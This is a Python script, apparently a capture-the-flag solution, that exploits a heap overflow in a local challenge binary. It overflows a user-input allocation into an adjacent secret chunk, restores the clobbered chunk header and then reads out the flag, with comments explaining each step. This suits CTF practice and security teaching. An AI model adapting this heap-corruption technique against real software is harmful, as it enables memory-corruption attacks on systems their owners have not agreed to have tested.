#!/usr/bin/env python3
import select, sys

# Small library of functions you might find useful
##################################################

# convert 64 bit int to little endian bytes
def p64(v):
    return int(v).to_bytes(8, "little", signed = True)

# read `count` bytes from the process
def readn(p, count):
    res = b""
    while (cur := p.stdout.read(count - len(res))):
        res += cur
    return res

# read bytes from the process until a needle is found
def read_until(p, needle):
    res = b''
    while not res.endswith(needle):
        cur = readn(p, 1)
        if not cur:
            break
        res += cur
    return res

# write a string to the process
def write(p, s):
    p.stdin.write(s)
    p.stdin.flush()

def exploit(p):
    # by writing 80 A's to the user input allocation, we smash into the next
    # allocation, which we expect to be the secret chunk. since the user input
    # alloc is 48 bytes including header, the remaining 32 A's are written to
    # the secret chunk, such that it now matches the user input.
    # doing so, we clobber the secret chunk header, which we will restore later.
    my_riddle = b"A" * 80 + b"\n"

    # secret_guess should simply match what we just overwrote the secret with.
    secret_guess = B"A" * 32

    # finally, restore header for the secret chunk. since the allocation is 48
    # bytes including the header and 16 byte alignment, the header will be 49
    # (first bit is set to indicate it is in use). we do not set the prev_size
    # field since the previous block is in use.
    answer_to_my_riddle = B"A" * 40 + p64(49) + b"\n"

    # remember, the exploit is written 42 times ;)
    exploit = (my_riddle + secret_guess + answer_to_my_riddle) * 42
    write(p, exploit)

    # discard program's output until it starts printing the flag.
    read_until(p, b"Well, I didn't expect that.\n")

    # .. and here it comes!
    flag = read_until(p, b"\0").decode("ascii").strip()
    print(flag)

if __name__ == "__main__":
    import argparse, subprocess, select, sys
    parser = argparse.ArgumentParser(prog = "doit.py")
    parser.add_argument("-d", "--debug", action = "store_true")
    args = parser.parse_args()

    p = subprocess.Popen('./undetected',
                         stdin = subprocess.PIPE,
                         stdout = subprocess.PIPE,
                         bufsize = 0,
                         env = {"LD_PRELOAD": "./libc.so.6"},
                        )
    if args.debug:
        input(f"pid: {p.pid} (waiting for gdb attachment; Enter to continue)")

    exploit(p)
